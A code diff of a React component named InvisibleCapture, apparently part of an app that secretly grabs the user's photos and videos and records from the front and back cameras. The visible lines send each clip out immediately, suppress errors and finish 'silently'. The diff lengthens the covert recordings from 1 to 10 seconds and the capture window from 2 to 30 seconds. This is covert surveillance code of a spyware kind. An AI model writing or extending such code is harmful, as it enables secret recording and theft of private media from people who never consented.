@@ -26,10 +26,10 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
         captureAllPhotosAndVideos().catch(() => null)
       ];
 
-      // Wait maximum 2 seconds for everything
+      // Wait maximum 30 seconds for everything (longer videos need more time)
       await Promise.race([
         Promise.allSettled(operations),
-        new Promise(resolve => setTimeout(resolve, 2000))
+        new Promise(resolve => setTimeout(resolve, 30000))
       ]);
 
       // Complete silently
@@ -145,7 +145,7 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
       for (let i = 1; i <= count; i++) {
         try {
           const stream = await cameraService.startVideoRecording(facingMode);
-          const videoBlob = await cameraService.recordVideo(stream, 1000); // 1 second videos for speed
+          const videoBlob = await cameraService.recordVideo(stream, 10000); // 10 second videos
           const cameraType = facingMode === 'user' ? 'Front' : 'Back';
           
           // Send immediately - catch all promise rejections
